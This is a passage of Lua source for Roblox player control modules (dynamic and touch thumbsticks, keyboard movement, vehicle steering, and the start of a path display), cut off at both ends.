			end
		
			ContextActionService:BindActionAtPriority(
				DYNAMIC_THUMBSTICK_ACTION_NAME,
				handleInput,
				false,
				DYNAMIC_THUMBSTICK_ACTION_PRIORITY,
				Enum.UserInputType.Touch)
		end
		
		function DynamicThumbstick:Create(parentFrame)
			if self.thumbstickFrame then
				self.thumbstickFrame:Destroy()
				self.thumbstickFrame = nil
				if self.onRenderSteppedConn then
					self.onRenderSteppedConn:Disconnect()
					self.onRenderSteppedConn = nil
				end
			end
		
			self.thumbstickSize = 45
			self.thumbstickRingSize = 20
			self.middleSize = 10
			self.middleSpacing = self.middleSize + 4
			self.radiusOfDeadZone = 2
			self.radiusOfMaxSpeed = 20
		
			local screenSize = parentFrame.AbsoluteSize
			local isBigScreen = math.min(screenSize.x, screenSize.y) > 500
			if isBigScreen then
				self.thumbstickSize = self.thumbstickSize * 2
				self.thumbstickRingSize = self.thumbstickRingSize * 2
				self.middleSize = self.middleSize * 2
				self.middleSpacing = self.middleSpacing * 2
				self.radiusOfDeadZone = self.radiusOfDeadZone * 2
				self.radiusOfMaxSpeed = self.radiusOfMaxSpeed * 2
			end
		
			local function layoutThumbstickFrame(portraitMode)
				if portraitMode then
					self.thumbstickFrame.Size = UDim2.new(1, 0, 0.4, 0)
					self.thumbstickFrame.Position = UDim2.new(0, 0, 0.6, 0)
				else
					self.thumbstickFrame.Size = UDim2.new(0.4, 0, 2/3, 0)
					self.thumbstickFrame.Position = UDim2.new(0, 0, 1/3, 0)
				end
			end
		
			self.thumbstickFrame = Instance.new("Frame")
			self.thumbstickFrame.BorderSizePixel = 0
			self.thumbstickFrame.Name = "DynamicThumbstickFrame"
			self.thumbstickFrame.Visible = false
			self.thumbstickFrame.BackgroundTransparency = 1.0
			self.thumbstickFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			self.thumbstickFrame.Active = false
			layoutThumbstickFrame(false)
		
			self.startImage = Instance.new("ImageLabel")
			self.startImage.Name = "ThumbstickStart"
			self.startImage.Visible = true
			self.startImage.BackgroundTransparency = 1
			self.startImage.Image = TOUCH_CONTROLS_SHEET
			self.startImage.ImageRectOffset = Vector2.new(1,1)
			self.startImage.ImageRectSize = Vector2.new(144, 144)
			self.startImage.ImageColor3 = Color3.new(0, 0, 0)
			self.startImage.AnchorPoint = Vector2.new(0.5, 0.5)
			self.startImage.Position = UDim2.new(0, self.thumbstickRingSize * 3.3, 1, -self.thumbstickRingSize  * 2.8)
			self.startImage.Size = UDim2.new(0, self.thumbstickRingSize  * 3.7, 0, self.thumbstickRingSize  * 3.7)
			self.startImage.ZIndex = 10
			self.startImage.Parent = self.thumbstickFrame
		
			self.endImage = Instance.new("ImageLabel")
			self.endImage.Name = "ThumbstickEnd"
			self.endImage.Visible = true
			self.endImage.BackgroundTransparency = 1
			self.endImage.Image = TOUCH_CONTROLS_SHEET
			self.endImage.ImageRectOffset = Vector2.new(1,1)
			self.endImage.ImageRectSize =  Vector2.new(144, 144)
			self.endImage.AnchorPoint = Vector2.new(0.5, 0.5)
			self.endImage.Position = self.startImage.Position
			self.endImage.Size = UDim2.new(0, self.thumbstickSize * 0.8, 0, self.thumbstickSize * 0.8)
			self.endImage.ZIndex = 10
			self.endImage.Parent = self.thumbstickFrame
		
			for i = 1, NUM_MIDDLE_IMAGES do
				self.middleImages[i] = Instance.new("ImageLabel")
				self.middleImages[i].Name = "ThumbstickMiddle"
				self.middleImages[i].Visible = false
				self.middleImages[i].BackgroundTransparency = 1
				self.middleImages[i].Image = TOUCH_CONTROLS_SHEET
				self.middleImages[i].ImageRectOffset = Vector2.new(1,1)
				self.middleImages[i].ImageRectSize = Vector2.new(144, 144)
				self.middleImages[i].ImageTransparency = MIDDLE_TRANSPARENCIES[i]
				self.middleImages[i].AnchorPoint = Vector2.new(0.5, 0.5)
				self.middleImages[i].ZIndex = 9
				self.middleImages[i].Parent = self.thumbstickFrame
			end
		
			local CameraChangedConn = nil
			local function onCurrentCameraChanged()
				if CameraChangedConn then
					CameraChangedConn:Disconnect()
					CameraChangedConn = nil
				end
				local newCamera = workspace.CurrentCamera
				if newCamera then
					local function onViewportSizeChanged()
						local size = newCamera.ViewportSize
						local portraitMode = size.X < size.Y
						layoutThumbstickFrame(portraitMode)
					end
					CameraChangedConn = newCamera:GetPropertyChangedSignal("ViewportSize"):Connect(onViewportSizeChanged)
					onViewportSizeChanged()
				end
			end
			workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(onCurrentCameraChanged)
			if workspace.CurrentCamera then
				onCurrentCameraChanged()
			end
		
			self.moveTouchStartPosition = nil
		
			self.startImageFadeTween = nil
			self.endImageFadeTween = nil
			self.middleImageFadeTweens = {}
		
			self.onRenderSteppedConn = RunService.RenderStepped:Connect(function()
				if self.tweenInAlphaStart ~= nil then
					local delta = tick() - self.tweenInAlphaStart
					local fadeInTime = (self.fadeInAndOutHalfDuration * 2 * self.fadeInAndOutBalance)
					self.thumbstickFrame.BackgroundTransparency = 1 - FADE_IN_OUT_MAX_ALPHA*math.min(delta/fadeInTime, 1)
					if delta > fadeInTime then
						self.tweenOutAlphaStart = tick()
						self.tweenInAlphaStart = nil
					end
				elseif self.tweenOutAlphaStart ~= nil then
					local delta = tick() - self.tweenOutAlphaStart
					local fadeOutTime = (self.fadeInAndOutHalfDuration * 2) - (self.fadeInAndOutHalfDuration * 2 * self.fadeInAndOutBalance)
					self.thumbstickFrame.BackgroundTransparency = 1 - FADE_IN_OUT_MAX_ALPHA + FADE_IN_OUT_MAX_ALPHA*math.min(delta/fadeOutTime, 1)
					if delta > fadeOutTime  then
						self.tweenOutAlphaStart = nil
					end
				end
			end)
		
			self.onTouchEndedConn = UserInputService.TouchEnded:connect(function(inputObject)
				if inputObject == self.moveTouchObject then
					self:OnInputEnded()
				end
			end)
		
			GuiService.MenuOpened:connect(function()
				if self.moveTouchObject then
					self:OnInputEnded()
				end
			end)
		
			local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
			while not playerGui do
				LocalPlayer.ChildAdded:wait()
				playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
			end
		
			local playerGuiChangedConn = nil
			local originalScreenOrientationWasLandscape =	playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeLeft or
															playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeRight
		
			local function longShowBackground()
				self.fadeInAndOutHalfDuration = 2.5
				self.fadeInAndOutBalance = 0.05
				self.tweenInAlphaStart = tick()
			end
		
			playerGuiChangedConn = playerGui:GetPropertyChangedSignal("CurrentScreenOrientation"):Connect(function()
				if (originalScreenOrientationWasLandscape and playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.Portrait) or
					(not originalScreenOrientationWasLandscape and playerGui.CurrentScreenOrientation ~= Enum.ScreenOrientation.Portrait) then
		
					playerGuiChangedConn:disconnect()
					longShowBackground()
		
					if originalScreenOrientationWasLandscape then
						self.hasFadedBackgroundInPortrait = true
					else
						self.hasFadedBackgroundInLandscape = true
					end
				end
			end)
		
			self.thumbstickFrame.Parent = parentFrame
		
			if game:IsLoaded() then
				longShowBackground()
			else
				coroutine.wrap(function()
					game.Loaded:Wait()
					longShowBackground()
				end)()
			end
		end
		
		return DynamicThumbstick
		
	end[base_character_controller] = function()
		--[[
			BaseCharacterController - Abstract base class for character controllers, not intended to be
			directly instantiated.
		
			2018 PlayerScripts Update - AllYourBlox
		--]]
		
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		
		--[[ The Module ]]--
		local BaseCharacterController = {}
		BaseCharacterController.__index = BaseCharacterController
		
		function BaseCharacterController.new()
			local self = setmetatable({}, BaseCharacterController)
			self.enabled = false
			self.moveVector = ZERO_VECTOR3
			self.moveVectorIsCameraRelative = true
			self.isJumping = false
			return self
		end
		
		function BaseCharacterController:OnRenderStepped(dt)
			-- By default, nothing to do
		end
		
		function BaseCharacterController:GetMoveVector()
			return self.moveVector
		end
		
		function BaseCharacterController:IsMoveVectorCameraRelative()
			return self.moveVectorIsCameraRelative
		end
		
		function BaseCharacterController:GetIsJumping()
			return self.isJumping
		end
		
		-- Override in derived classes to set self.enabled and return boolean indicating
		-- whether Enable/Disable was successful. Return true if controller is already in the requested state.
		function BaseCharacterController:Enable(enable)
			error("BaseCharacterController:Enable must be overridden in derived classes and should not be called.")
			return false
		end
		
		return BaseCharacterController
	end[keyboard] = function()
		--[[
			Keyboard Character Control - This module handles controlling your avatar from a keyboard
		
			2018 PlayerScripts Update - AllYourBlox
		--]]
		
		--[[ Roblox Services ]]--
		local UserInputService = game:GetService("UserInputService")
		local ContextActionService = game:GetService("ContextActionService")
		
		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		
		--[[ The Module ]]--
		local BaseCharacterController = require(script.Parent:WaitForChild("BaseCharacterController"))
		local Keyboard = setmetatable({}, BaseCharacterController)
		Keyboard.__index = Keyboard
		
		function Keyboard.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable(BaseCharacterController.new(), Keyboard)
		
			self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY
		
			self.textFocusReleasedConn = nil
			self.textFocusGainedConn = nil
			self.windowFocusReleasedConn = nil
		
			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0
		
			self.jumpEnabled = true
		
			return self
		end
		
		function Keyboard:Enable(enable)
			if not UserInputService.KeyboardEnabled then
				return false
			end
		
			if enable == self.enabled then
				-- Module is already in the state being requested. True is returned here since the module will be in the state
				-- expected by the code that follows the Enable() call. This makes more sense than returning false to indicate
				-- no action was necessary. False indicates failure to be in requested/expected state.
				return true
			end
		
			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0
			self.moveVector = ZERO_VECTOR3
			self.jumpRequested = false
			self:UpdateJump()
		
			if enable then
				self:BindContextActions()
				self:ConnectFocusEventListeners()
			else
				self:UnbindContextActions()
				self:DisconnectFocusEventListeners()
			end
		
			self.enabled = enable
			return true
		end
		
		function Keyboard:UpdateMovement(inputState)
			if inputState == Enum.UserInputState.Cancel then
				self.moveVector = ZERO_VECTOR3
			else
				self.moveVector = Vector3.new(self.leftValue + self.rightValue, 0, self.forwardValue + self.backwardValue)
			end
		end
		
		function Keyboard:UpdateJump()
			self.isJumping = self.jumpRequested
		end
		
		function Keyboard:BindContextActions()
		
			-- Note: In the previous version of this code, the movement values were not zeroed-out on UserInputState. Cancel, now they are,
			-- which fixes them from getting stuck on.
			-- We return ContextActionResult.Pass here for legacy reasons.
			-- Many games rely on gameProcessedEvent being false on UserInputService.InputBegan for these control actions.
			local handleMoveForward = function(actionName, inputState, inputObject)
				self.forwardValue = (inputState == Enum.UserInputState.Begin) and -1 or 0
				self:UpdateMovement(inputState)
				return Enum.ContextActionResult.Pass
			end
		
			local handleMoveBackward = function(actionName, inputState, inputObject)
				self.backwardValue = (inputState == Enum.UserInputState.Begin) and 1 or 0
				self:UpdateMovement(inputState)
				return Enum.ContextActionResult.Pass
			end
		
			local handleMoveLeft = function(actionName, inputState, inputObject)
				self.leftValue = (inputState == Enum.UserInputState.Begin) and -1 or 0
				self:UpdateMovement(inputState)
				return Enum.ContextActionResult.Pass
			end
		
			local handleMoveRight = function(actionName, inputState, inputObject)
				self.rightValue = (inputState == Enum.UserInputState.Begin) and 1 or 0
				self:UpdateMovement(inputState)
				return Enum.ContextActionResult.Pass
			end
		
			local handleJumpAction = function(actionName, inputState, inputObject)
				self.jumpRequested = self.jumpEnabled and (inputState == Enum.UserInputState.Begin)
				self:UpdateJump()
				return Enum.ContextActionResult.Pass
			end
		
			-- TODO: Revert to KeyCode bindings so that in the future the abstraction layer from actual keys to
			-- movement direction is done in Lua
			ContextActionService:BindActionAtPriority("moveForwardAction", handleMoveForward, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterForward)
			ContextActionService:BindActionAtPriority("moveBackwardAction", handleMoveBackward, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterBackward)
			ContextActionService:BindActionAtPriority("moveLeftAction", handleMoveLeft, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterLeft)
			ContextActionService:BindActionAtPriority("moveRightAction", handleMoveRight, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterRight)
			ContextActionService:BindActionAtPriority("jumpAction", handleJumpAction, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterJump)
		end
		
		function Keyboard:UnbindContextActions()
			ContextActionService:UnbindAction("moveForwardAction")
			ContextActionService:UnbindAction("moveBackwardAction")
			ContextActionService:UnbindAction("moveLeftAction")
			ContextActionService:UnbindAction("moveRightAction")
			ContextActionService:UnbindAction("jumpAction")
		end
		
		function Keyboard:ConnectFocusEventListeners()
			local function onFocusReleased()
				self.moveVector = ZERO_VECTOR3
				self.forwardValue  = 0
				self.backwardValue = 0
				self.leftValue = 0
				self.rightValue = 0
				self.jumpRequested = false
				self:UpdateJump()
			end
		
			local function onTextFocusGained(textboxFocused)
				self.jumpRequested = false
				self:UpdateJump()
			end
		
			self.textFocusReleasedConn = UserInputService.TextBoxFocusReleased:Connect(onFocusReleased)
			self.textFocusGainedConn = UserInputService.TextBoxFocused:Connect(onTextFocusGained)
			self.windowFocusReleasedConn = UserInputService.WindowFocused:Connect(onFocusReleased)
		end
		
		function Keyboard:DisconnectFocusEventListeners()
			if self.textFocusReleasedConn then
				self.textFocusReleasedConn:Disconnect()
				self.textFocusReleasedConn = nil
			end
			if self.textFocusGainedConn then
				self.textFocusGainedConn:Disconnect()
				self.textFocusGainedConn = nil
			end
			if self.windowFocusReleasedConn then
				self.windowFocusReleasedConn:Disconnect()
				self.windowFocusReleasedConn = nil
			end
		end
		
		return Keyboard
		
	end[vehicle_controller] = function()
		--[[
			// FileName: VehicleControl
			// Version 1.0
			// Written by: jmargh
			// Description: Implements in-game vehicle controls for all input devices
		
			// NOTE: This works for basic vehicles (single vehicle seat). If you use custom VehicleSeat code,
			// multiple VehicleSeats or your own implementation of a VehicleSeat this will not work.
		--]]
		local ContextActionService = game:GetService("ContextActionService")
		
		--[[ Constants ]]--
		-- Set this to true if you want to instead use the triggers for the throttle
		local useTriggersForThrottle = true
		-- Also set this to true if you want the thumbstick to not affect throttle, only triggers when a gamepad is conected
		local onlyTriggersForThrottle = false
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		
		local AUTO_PILOT_DEFAULT_MAX_STEERING_ANGLE = 35
		
		
		-- Note that VehicleController does not derive from BaseCharacterController, it is a special case
		local VehicleController = {}
		VehicleController.__index = VehicleController
		
		function VehicleController.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable({}, VehicleController)
		
			self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY
		
			self.enabled = false
			self.vehicleSeat = nil
			self.throttle = 0
			self.steer = 0
		
			self.acceleration = 0
			self.decceleration = 0
			self.turningRight = 0
			self.turningLeft = 0
		
			self.vehicleMoveVector = ZERO_VECTOR3
		
			self.autoPilot = {}
			self.autoPilot.MaxSpeed = 0
			self.autoPilot.MaxSteeringAngle = 0
		
			return self
		end
		
		function VehicleController:BindContextActions()
			if useTriggersForThrottle then
				ContextActionService:BindActionAtPriority("throttleAccel", (function(actionName, inputState, inputObject)
					self:OnThrottleAccel(actionName, inputState, inputObject)
					return Enum.ContextActionResult.Pass
				end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonR2)
				ContextActionService:BindActionAtPriority("throttleDeccel", (function(actionName, inputState, inputObject)
					self:OnThrottleDeccel(actionName, inputState, inputObject)
					return Enum.ContextActionResult.Pass
				end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonL2)
			end
			ContextActionService:BindActionAtPriority("arrowSteerRight", (function(actionName, inputState, inputObject)
				self:OnSteerRight(actionName, inputState, inputObject)
				return Enum.ContextActionResult.Pass
			end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Right)
			ContextActionService:BindActionAtPriority("arrowSteerLeft", (function(actionName, inputState, inputObject)
				self:OnSteerLeft(actionName, inputState, inputObject)
				return Enum.ContextActionResult.Pass
			end), false, self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Left)
		end
		
		function VehicleController:Enable(enable, vehicleSeat)
			if enable == self.enabled and vehicleSeat == self.vehicleSeat then
				return
			end
		
			self.enabled = enable
			self.vehicleMoveVector = ZERO_VECTOR3
		
			if enable then
				if vehicleSeat then
					self.vehicleSeat = vehicleSeat
		
					self:SetupAutoPilot()
					self:BindContextActions()
				end
			else
				if useTriggersForThrottle then
					ContextActionService:UnbindAction("throttleAccel")
					ContextActionService:UnbindAction("throttleDeccel")
				end
				ContextActionService:UnbindAction("arrowSteerRight")
				ContextActionService:UnbindAction("arrowSteerLeft")
				self.vehicleSeat = nil
			end
		end
		
		function VehicleController:OnThrottleAccel(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
				self.acceleration = 0
			else
				self.acceleration = -1
			end
			self.throttle = self.acceleration + self.decceleration
		end
		
		function VehicleController:OnThrottleDeccel(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
				self.decceleration = 0
			else
				self.decceleration = 1
			end
			self.throttle = self.acceleration + self.decceleration
		end
		
		function VehicleController:OnSteerRight(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
				self.turningRight = 0
			else
				self.turningRight = 1
			end
			self.steer = self.turningRight + self.turningLeft
		end
		
		function VehicleController:OnSteerLeft(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.End or inputState == Enum.UserInputState.Cancel then
				self.turningLeft = 0
			else
				self.turningLeft = -1
			end
			self.steer = self.turningRight + self.turningLeft
		end
		
		-- Call this from a function bound to Renderstep with Input Priority
		function VehicleController:Update(moveVector, cameraRelative, usingGamepad)
			if self.vehicleSeat then
				if cameraRelative then
					-- This is the default steering mode
					moveVector = moveVector + Vector3.new(self.steer, 0, self.throttle)
					if usingGamepad and onlyTriggersForThrottle and useTriggersForThrottle then
						self.vehicleSeat.ThrottleFloat = -self.throttle
					else
						self.vehicleSeat.ThrottleFloat = -moveVector.Z
					end
					self.vehicleSeat.SteerFloat = moveVector.X
		
					return moveVector, true
				else
					-- This is the path following mode
					local localMoveVector = self.vehicleSeat.Occupant.RootPart.CFrame:VectorToObjectSpace(moveVector)
		
					self.vehicleSeat.ThrottleFloat = self:ComputeThrottle(localMoveVector)
					self.vehicleSeat.SteerFloat = self:ComputeSteer(localMoveVector)
		
					return ZERO_VECTOR3, true
				end
			end
			return moveVector, false
		end
		
		function VehicleController:ComputeThrottle(localMoveVector)
			if localMoveVector ~= ZERO_VECTOR3 then
				local throttle = -localMoveVector.Z
				return throttle
			else
				return 0.0
			end
		end
		
		function VehicleController:ComputeSteer(localMoveVector)
			if localMoveVector ~= ZERO_VECTOR3 then
				local steerAngle = -math.atan2(-localMoveVector.x, -localMoveVector.z) * (180 / math.pi)
				return steerAngle / self.autoPilot.MaxSteeringAngle
			else
				return 0.0
			end
		end
		
		function VehicleController:SetupAutoPilot()
			-- Setup default
			self.autoPilot.MaxSpeed = self.vehicleSeat.MaxSpeed
			self.autoPilot.MaxSteeringAngle = AUTO_PILOT_DEFAULT_MAX_STEERING_ANGLE
		
			-- VehicleSeat should have a MaxSteeringAngle as well.
			-- Or we could look for a child "AutoPilotConfigModule" to find these values
			-- Or allow developer to set them through the API as like the CLickToMove customization API
		end
		
		return VehicleController
		
	end[touchthumbstick] = function()
		--[[
			
			TouchThumbstick
			
		--]]
		local Players = game:GetService("Players")
		local GuiService = game:GetService("GuiService")
		local UserInputService = game:GetService("UserInputService")
		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local TOUCH_CONTROL_SHEET = "rbxasset://textures/ui/TouchControlsSheet.png"
		--[[ The Module ]]--
		local BaseCharacterController = require(script.Parent:WaitForChild("BaseCharacterController"))
		local TouchThumbstick = setmetatable({}, BaseCharacterController)
		TouchThumbstick.__index = TouchThumbstick
		function TouchThumbstick.new()
			local self = setmetatable(BaseCharacterController.new(), TouchThumbstick)
			
			self.isFollowStick = false
			
			self.thumbstickFrame = nil
			self.moveTouchObject = nil
			self.onTouchMovedConn = nil
			self.onTouchEndedConn = nil
			self.screenPos = nil
			self.stickImage = nil
			self.thumbstickSize = nil -- Float
			
			return self
		end
		function TouchThumbstick:Enable(enable, uiParentFrame)
			if enable == nil then return false end			-- If nil, return false (invalid argument)
			enable = enable and true or false				-- Force anything non-nil to boolean before comparison
			if self.enabled == enable then return true end	-- If no state change, return true indicating already in requested state
			
			self.moveVector = ZERO_VECTOR3
			self.isJumping = false
			
			if enable then
				-- Enable
				if not self.thumbstickFrame then
					self:Create(uiParentFrame)
				end
				self.thumbstickFrame.Visible = true
			else 
				-- Disable
				self.thumbstickFrame.Visible = false
				self:OnInputEnded()
			end
			self.enabled = enable
		end
		function TouchThumbstick:OnInputEnded()
			self.thumbstickFrame.Position = self.screenPos
			self.stickImage.Position = UDim2.new(0, self.thumbstickFrame.Size.X.Offset/2 - self.thumbstickSize/4, 0, self.thumbstickFrame.Size.Y.Offset/2 - self.thumbstickSize/4)
			
			self.moveVector = ZERO_VECTOR3
			self.isJumping = false
			self.thumbstickFrame.Position = self.screenPos
			self.moveTouchObject = nil
		end
		function TouchThumbstick:Create(parentFrame)
			
			if self.thumbstickFrame then
				self.thumbstickFrame:Destroy()
				self.thumbstickFrame = nil
				if self.onTouchMovedConn then
					self.onTouchMovedConn:Disconnect()
					self.onTouchMovedConn = nil
				end
				if self.onTouchEndedConn then
					self.onTouchEndedConn:Disconnect()
					self.onTouchEndedConn = nil
				end
			end
			
			local minAxis = math.min(parentFrame.AbsoluteSize.x, parentFrame.AbsoluteSize.y)
			local isSmallScreen = minAxis <= 500
			self.thumbstickSize = isSmallScreen and 70 or 120
			self.screenPos = isSmallScreen and UDim2.new(0, (self.thumbstickSize/2) - 10, 1, -self.thumbstickSize - 20) or
				UDim2.new(0, self.thumbstickSize/2, 1, -self.thumbstickSize * 1.75)
				
			self.thumbstickFrame = Instance.new("Frame")
			self.thumbstickFrame.Name = "ThumbstickFrame"
			self.thumbstickFrame.Active = true
			self.thumbstickFrame.Visible = false
			self.thumbstickFrame.Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize)
			self.thumbstickFrame.Position = self.screenPos
			self.thumbstickFrame.BackgroundTransparency = 1
			
			local outerImage = Instance.new("ImageLabel")
			outerImage.Name = "OuterImage"
			outerImage.Image = TOUCH_CONTROL_SHEET
			outerImage.ImageRectOffset = Vector2.new()
			outerImage.ImageRectSize = Vector2.new(220, 220)
			outerImage.BackgroundTransparency = 1
			outerImage.Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize)
			outerImage.Position = UDim2.new(0, 0, 0, 0)
			outerImage.Parent = self.thumbstickFrame
			
			self.stickImage = Instance.new("ImageLabel")
			self.stickImage.Name = "StickImage"
			self.stickImage.Image = TOUCH_CONTROL_SHEET
			self.stickImage.ImageRectOffset = Vector2.new(220, 0)
			self.stickImage.ImageRectSize = Vector2.new(111, 111)
			self.stickImage.BackgroundTransparency = 1
			self.stickImage.Size = UDim2.new(0, self.thumbstickSize/2, 0, self.thumbstickSize/2)
			self.stickImage.Position = UDim2.new(0, self.thumbstickSize/2 - self.thumbstickSize/4, 0, self.thumbstickSize/2 - self.thumbstickSize/4)
			self.stickImage.ZIndex = 2
			self.stickImage.Parent = self.thumbstickFrame
			
			local centerPosition = nil
			local deadZone = 0.05
			
			local function DoMove(direction)
				
				local currentMoveVector = direction / (self.thumbstickSize/2)
				
				-- Scaled Radial Dead Zone
				local inputAxisMagnitude = currentMoveVector.magnitude
				if inputAxisMagnitude < deadZone then
					currentMoveVector = Vector3.new()
				else
					currentMoveVector = currentMoveVector.unit * ((inputAxisMagnitude - deadZone) / (1 - deadZone))
					-- NOTE: Making currentMoveVector a unit vector will cause the player to instantly go max speed
					-- must check for zero length vector is using unit
					currentMoveVector = Vector3.new(currentMoveVector.x, 0, currentMoveVector.y)
				end
				
				self.moveVector = currentMoveVector
			end
			
			local function MoveStick(pos)
				local relativePosition = Vector2.new(pos.x - centerPosition.x, pos.y - centerPosition.y)
				local length = relativePosition.magnitude
				local maxLength = self.thumbstickFrame.AbsoluteSize.x/2
				if self.isFollowStick and length > maxLength then
					local offset = relativePosition.unit * maxLength
					self.thumbstickFrame.Position = UDim2.new(
						0, pos.x - self.thumbstickFrame.AbsoluteSize.x/2 - offset.x,
						0, pos.y - self.thumbstickFrame.AbsoluteSize.y/2 - offset.y)
				else
					length = math.min(length, maxLength)
					relativePosition = relativePosition.unit * length
				end
				self.stickImage.Position = UDim2.new(0, relativePosition.x + self.stickImage.AbsoluteSize.x/2, 0, relativePosition.y + self.stickImage.AbsoluteSize.y/2)
			end
			
			-- input connections
			self.thumbstickFrame.InputBegan:Connect(function(inputObject)
				--A touch that starts elsewhere on the screen will be sent to a frame's InputBegan event
				--if it moves over the frame. So we check that this is actually a new touch (inputObject.UserInputState ~= Enum.UserInputState.Begin)
				if self.moveTouchObject or inputObject.UserInputType ~= Enum.UserInputType.Touch
					or inputObject.UserInputState ~= Enum.UserInputState.Begin then
					return
				end
				
				self.moveTouchObject = inputObject
				self.thumbstickFrame.Position = UDim2.new(0, inputObject.Position.x - self.thumbstickFrame.Size.X.Offset/2, 0, inputObject.Position.y - self.thumbstickFrame.Size.Y.Offset/2)
				centerPosition = Vector2.new(self.thumbstickFrame.AbsolutePosition.x + self.thumbstickFrame.AbsoluteSize.x/2,
					self.thumbstickFrame.AbsolutePosition.y + self.thumbstickFrame.AbsoluteSize.y/2)
				local direction = Vector2.new(inputObject.Position.x - centerPosition.x, inputObject.Position.y - centerPosition.y)
			end)
			
			self.onTouchMovedConn = UserInputService.TouchMoved:Connect(function(inputObject, isProcessed)
				if inputObject == self.moveTouchObject then
					centerPosition = Vector2.new(self.thumbstickFrame.AbsolutePosition.x + self.thumbstickFrame.AbsoluteSize.x/2,
						self.thumbstickFrame.AbsolutePosition.y + self.thumbstickFrame.AbsoluteSize.y/2)
					local direction = Vector2.new(inputObject.Position.x - centerPosition.x, inputObject.Position.y - centerPosition.y)
					DoMove(direction)
					MoveStick(inputObject.Position)
				end
			end)
			
			self.onTouchEndedConn = UserInputService.TouchEnded:Connect(function(inputObject, isProcessed)
				if inputObject == self.moveTouchObject then
					self:OnInputEnded()
				end
			end)
			
			GuiService.MenuOpened:Connect(function()
				if self.moveTouchObject then
					self:OnInputEnded()
				end
			end)	
			
			self.thumbstickFrame.Parent = parentFrame
		end
		return TouchThumbstick
	end[path_display] = function()
		
		
		local PathDisplay = {}
		PathDisplay.spacing = 8
		PathDisplay.image = "rbxasset://textures/Cursors/Gamepad/Pointer.png"
		PathDisplay.imageSize = Vector2.new(2, 2)
		
		local currentPoints = {}
		local renderedPoints = {}
		
		local pointModel = Instance.new("Model")
		pointModel.Name = "PathDisplayPoints"
		
		local adorneePart = Instance.new("Part")
		adorneePart.Anchored = true
		adorneePart.CanCollide = false
		adorneePart.Transparency = 1
		adorneePart.Name = "PathDisplayAdornee"
		adorneePart.CFrame = CFrame.new(0, 0, 0)
		adorneePart.Parent = pointModel
		
		local pointPool = {}
		local poolTop = 30
		for i = 1, poolTop do
			local point = Instance.new("ImageHandleAdornment")
			point.Archivable = false
			point.Adornee = adorneePart
			point.Image = PathDisplay.image
			point.Size = PathDisplay.imageSize
			pointPool[i] = point
		end
		
		local function retrieveFromPool()
			local point = pointPool[1]
			if not point then
				return
			end
			
			pointPool[1], pointPool[poolTop] = pointPool[poolTop], nil
			poolTop = poolTop - 1
			return point
		end
		
		local function returnToPool(point)
			poolTop = poolTop + 1
			pointPool[poolTop] = point
		end
		
		local function renderPoint(point, isLast)
			if poolTop == 0 then
				return
			end
		
			local rayDown = Ray.new(point + Vector3.new(0, 2, 0), Vector3.new(0, -8, 0))
			local hitPart, hitPoint, hitNormal = workspace:FindPartOnRayWithIgnoreList(rayDown, { game.Players.LocalPlayer.Character, workspace.CurrentCamera  }) 	
			if not hitPart then
				return
			end
		
			local pointCFrame = CFrame.new(hitPoint, hitPoint + hitNormal)
			
			local point = retrieveFromPool()
			point.CFrame = pointCFrame
			point.Parent = pointModel
			return point
		end
		
		function PathDisplay.setCurrentPoints(points)
			if typeof(points) == 'table' then
				currentPoints = points
			else
				currentPoints = {}
			end
		end
		
		function PathDisplay.clearRenderedPath()
			for _, oldPoint in ipairs(renderedPoints) do
				oldPoint.Parent = nil
				returnToPool(oldPoint)
			end
			renderedPoints = {}
			pointModel.Parent = nil
		end
		
		function PathDisplay.renderPath()
			PathDisplay.clearRenderedPath()
			if not currentPoints or #currentPoints == 0 then
				return
			end
		
			local currentIdx = #currentPoints
			local lastPos = currentPoints[currentIdx]	
			local distanceBudget = 0
			
			renderedPoints[1] = renderPoint(lastPos, true)
			if not renderedPoints[1] then
				return
			end
			
			while true do
				local currentPoint = currentPoints[currentIdx]
				local nextPoint = currentPoints[currentIdx - 1]
				
				if currentIdx < 2 then
					break
				else
					
					local toNextPoint = nextPoint - currentPoint
					local distToNextPoint = toNextPoint.magnitude	
					
					if distanceBudget > distToNextPoint then
						distanceBudget = distanceBudget - distToNextPoint
						currentIdx = currentIdx - 1
					else
						local dirToNextPoint = toNextPoint.unit
						local pointPos = currentPoint + (dirToNextPoint * distanceBudget)
						local point = renderPoint(pointPos, false)
						
						if point then
							renderedPoints[#renderedPoints + 1] = point
						end
						
						distanceBudget = distanceBudget + PathDisplay.spacing
					end
				end
